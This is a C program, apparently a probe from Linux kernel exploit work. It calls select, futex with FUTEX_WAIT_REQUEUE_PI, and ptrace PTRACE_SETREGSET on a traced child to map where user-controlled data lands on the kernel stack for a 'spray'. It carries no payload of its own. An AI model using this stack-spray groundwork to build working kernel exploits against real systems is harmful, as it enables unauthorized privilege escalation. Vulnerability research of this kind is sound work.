/* Live stack-layout probe for the ptrace(PTRACE_SETREGSET) spray candidate,
 * same technique as stacktest.c but for gpr_set()'s `newregs` local instead
 * of core_sys_select()'s stack_fds. Calls pselect6/futex first (same as
 * stacktest.c, for a shared pt_regs anchor cross-check against previous
 * measurements), then does the ptrace dance on the same thread. */
#define _GNU_SOURCE
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  printf("[ptrace_stacktest] pid=%d\n", getpid());

  fd_set in, out, ex;
  FD_ZERO(&in);
  FD_ZERO(&out);
  FD_ZERO(&ex);
  struct timeval tv = {0, 0};
  printf("[ptrace_stacktest] about to call pselect6(nfds=320)\n");
  int r = select(320, &in, &out, &ex, &tv);
  printf("[ptrace_stacktest] pselect6 returned %d errno=%d\n", r, errno);

  uint32_t f_wait = 0, f_target = 0;
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  printf("[ptrace_stacktest] about to call futex(FUTEX_WAIT_REQUEUE_PI)\n");
  long fr = syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_target, 0);
  printf("[ptrace_stacktest] futex returned %ld errno=%d\n", fr, errno);

  pid_t child = fork();
  if (child == 0) {
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    raise(SIGSTOP);
    _exit(0);
  }
  int status;
  waitpid(child, &status, 0);

  unsigned char regbuf[272];
  memset(regbuf, 0, sizeof(regbuf));
  struct iovec iov = { regbuf, sizeof(regbuf) };
  printf("[ptrace_stacktest] about to call ptrace(PTRACE_SETREGSET) child=%d\n", child);
  long pr = ptrace(PTRACE_SETREGSET, child, (void *)1 /* NT_PRSTATUS */, &iov);
  printf("[ptrace_stacktest] ptrace(SETREGSET) returned %ld errno=%d\n", pr, errno);

  ptrace(PTRACE_KILL, child, 0, 0);
  waitpid(child, &status, 0);

  printf("[ptrace_stacktest] done\n");
  return 0;
}
